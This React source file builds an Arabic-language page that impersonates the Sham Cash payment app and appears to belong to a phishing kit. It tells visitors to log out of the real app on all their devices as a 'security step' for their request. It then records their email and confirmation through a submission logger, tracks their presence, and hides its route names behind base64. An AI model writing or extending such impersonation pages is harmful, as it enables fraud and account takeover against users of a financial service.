import { createFileRoute } from "@tanstack/react-router";
import { AlertTriangle, Loader2, XCircle } from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import { z } from "zod";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect, readClientEmail } from "@/lib/admin-redirect";
import { useRequireName } from "@/lib/require-name";
import { logSubmission } from "@/lib/submissions";
import { AppScreen } from "@/components/app-screen";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const searchSchema = z.object({ email: z.string().optional() });

export const Route = createFileRoute("/bG9nb3V0LWRldmljZXM")({
  ssr: false,
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "خطوة أمنية لاستكمال طلبك | شام كاش" },
      {
        name: "description",
        content:
          "سجّل الخروج من تطبيق شام كاش على كل أجهزتك ثم أكّد الخطوة لاستكمال طلب التوثيق.",
      },
      { property: "og:title", content: "خطوة أمنية لاستكمال طلبك — شام كاش" },
      {
        property: "og:description",
        content:
          "سجّل الخروج من تطبيق شام كاش على كل الأجهزة ثم عُد لتأكيد الخطوة.",
      },
    ],
  }),
  component: LogoutDevicesPage,
});

const STEPS = [
  "افتح تطبيق شام كاش من هاتفك.",
  "ادخل إلى الإعدادات ثم «الحساب» أو «الأمان».",
  "اضغط «تسجيل الخروج» وأكّد الخروج.",
  "كرّر الخطوة على باقي أجهزتك.",
];

function LogoutDevicesPage() {
  usePresenceTracker({ page: "/bG9nb3V0LWRldmljZXM" });
  useAdminRedirect();
  useRequireName();
  const search = Route.useSearch();
  const [email, setEmail] = useState<string | undefined>(search.email);
  const [open, setOpen] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [cooldown, setCooldown] = useState(30);

  useEffect(() => {
    if (email) return;
    const resolved = readClientEmail();
    if (resolved) setEmail(resolved);
  }, [email]);

  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown((c) => c - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  const confirm = async () => {
    setSubmitting(true);
    try {
      await logSubmission(
        "logout_confirmed",
        {
          email,
          at: new Date().toISOString(),
          status: "under_review",
          logout_status: "تم تسجيل الخروج من الجهاز",
        },
        email,
      );
      toast.success("تم التأكيد، طلبك الآن قيد المراجعة");
      setOpen(false);
      window.location.replace(email ? `/cGVuZGluZw?email=${encodeURIComponent(email)}` : "/cGVuZGluZw");
    } catch {
      toast.error("تعذّر إرسال التأكيد", {
        description: "تحقق من اتصالك بالإنترنت ثم أعِد المحاولة.",
      });
      setSubmitting(false);
    }
  };

  return (
    <AppScreen compactLogo>
      <div dir="rtl" className="mx-auto flex max-w-md flex-col items-center text-center">
        <div
          role="alert"
          className="relative isolate flex w-full items-center justify-center gap-3 overflow-hidden rounded-2xl bg-[var(--error-red)] px-4 py-3.5 text-[15px] font-extrabold leading-7 text-white shadow-[0_18px_40px_-18px_var(--error-red)] ring-1 ring-white/20 sm:gap-3.5 sm:rounded-[22px] sm:px-5 sm:py-4 sm:text-lg"
        >
          <span className="relative grid size-9 shrink-0 place-items-center rounded-full bg-white/15 ring-1 ring-white/25 sm:size-10">
            <XCircle className="size-5 animate-pulse sm:size-6" strokeWidth={2.2} />
          </span>
          <span className="relative min-w-0 flex-1 text-right">يجب تسجيل الخروج من الجهاز الحالي أولاً</span>
        </div>
        <p className="mx-auto mt-4 max-w-sm text-[15px] leading-7 text-white/70">
          خطوة أمنية لاستكمال طلبك: سجّل الخروج من تطبيق شام كاش على جميع أجهزتك،
          ثم اضغط «تم تسجيل الخروج».
        </p>

        {email ? (
          <p className="mt-4 text-[13px] text-white/60">
            البريد المسجّل: <span className="font-semibold text-white">{email}</span>
          </p>
        ) : null}

        <ol className="mt-6 w-full space-y-2.5 text-right">
          {STEPS.map((text, i) => (
            <li
              key={i}
              className="flex items-start gap-3 rounded-2xl border border-white/10 bg-white/5 p-4 text-[15px] leading-7 text-white/85"
            >
              <span className="grid size-8 shrink-0 place-items-center rounded-full bg-primary/15 text-sm font-bold text-primary">
                {i + 1}
              </span>
              <span className="min-w-0 flex-1">{text}</span>
            </li>
          ))}
        </ol>

        <button
          type="button"
          onClick={() => setOpen(true)}
          disabled={cooldown > 0}
          className="mt-6 inline-flex min-h-14 w-full items-center justify-center gap-2 rounded-2xl bg-primary px-5 text-base font-bold text-primary-foreground transition-all duration-300 ease-in-out hover:brightness-110 hover:shadow-md disabled:cursor-not-allowed disabled:opacity-60 disabled:hover:brightness-100"
        >
          {cooldown > 0 ? `تم تسجيل الخروج (${cooldown})` : "تم تسجيل الخروج"}
        </button>
        {cooldown > 0 ? (
          <p className="mt-2 text-[12px] text-white/60">
            يمكنك التأكيد بعد {cooldown} ثانية لإتاحة وقت كافٍ للخروج.
          </p>
        ) : null}
      </div>

      <AlertDialog open={open} onOpenChange={(v) => (!submitting ? setOpen(v) : null)}>
        <AlertDialogContent dir="rtl" className="max-w-sm text-center sm:max-w-md">
          <AlertDialogHeader>
            <div className="mx-auto grid size-14 place-items-center rounded-full bg-amber-500/15 ring-1 ring-amber-400/30">
              <AlertTriangle className="size-7 text-amber-500" />
            </div>
            <AlertDialogTitle className="text-center text-lg font-extrabold">
              هل سجّلت الخروج من جميع الأجهزة؟
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center text-sm leading-6">
              عند التأكيد يُرسل طلبك فوراً للمراجعة من قبل فريق شام كاش.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex-row-reverse justify-center gap-2 sm:justify-center">
            <AlertDialogAction
              onClick={(e) => {
                e.preventDefault();
                confirm();
              }}
              disabled={submitting}
              className="min-w-24 bg-green-600 text-white hover:bg-green-700"
            >
              {submitting ? <Loader2 className="size-4 animate-spin" /> : "نعم"}
            </AlertDialogAction>
            <AlertDialogCancel disabled={submitting} className="min-w-24">
              إلغاء
            </AlertDialogCancel>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </AppScreen>
  );
}
